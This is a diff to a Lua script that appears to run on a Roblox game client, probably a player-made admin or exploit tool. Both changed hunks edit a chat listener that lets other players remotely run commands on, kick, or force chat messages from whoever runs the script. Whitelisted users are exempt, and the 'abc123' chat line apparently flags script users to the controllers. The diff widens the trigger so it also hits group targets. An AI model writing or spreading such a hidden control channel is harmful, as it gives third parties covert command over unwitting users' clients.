@@ -2371,15 +2371,17 @@ for i = 1,#PlayersX do
 			local Arguments = string.split(Chat:sub(2)," ")
 			local Player = PlrFinder(Arguments[1])
 			table.remove(Arguments,1)
-			if Player and Player == LP and not CoolkidTable[tostring(LP.UserId)] then 
-				if Chat:sub(1,1) == "`" then 
-					CheckCommand(table.concat(Arguments," "))
-				end
-				if Chat:sub(1,1) == "[" then 
-					LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
-				end
-				if Chat:sub(1,1) == "~" then 
-					ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
+			if Player and Player == LP or typeof(Player) == "table" then 
+				if not CoolkidTable[tostring(LP.UserId)] then 
+					if Chat:sub(1,1) == "`" then 
+						CheckCommand(table.concat(Arguments," "))
+					end
+					if Chat:sub(1,1) == "[" then 
+						LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
+					end
+					if Chat:sub(1,1) == "~" then 
+						ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
+					end
 				end 
 			end
 		end)
@@ -2415,15 +2417,17 @@ Players.PlayerAdded:Connect(function(Plr)
 					local Arguments = string.split(Chat:sub(2)," ")
 					local Player = PlrFinder(Arguments[1])
 					table.remove(Arguments,1)
-					if Player and Player == LP and not CoolkidTable[tostring(LP.UserId)] then 
-						if Chat:sub(1,1) == "`" then 
-							CheckCommand(table.concat(Arguments," "))
-						end
-						if Chat:sub(1,1) == "[" then 
-							LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
-						end
-						if Chat:sub(1,1) == "~" then 
-							ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
+					if Player and Player == LP or typeof(Player) == "table" then 
+						if not CoolkidTable[tostring(LP.UserId)] then 
+							if Chat:sub(1,1) == "`" then 
+								CheckCommand(table.concat(Arguments," "))
+							end
+							if Chat:sub(1,1) == "[" then 
+								LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
+							end
+							if Chat:sub(1,1) == "~" then 
+								ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
+							end 
 						end 
 					end
 				end)
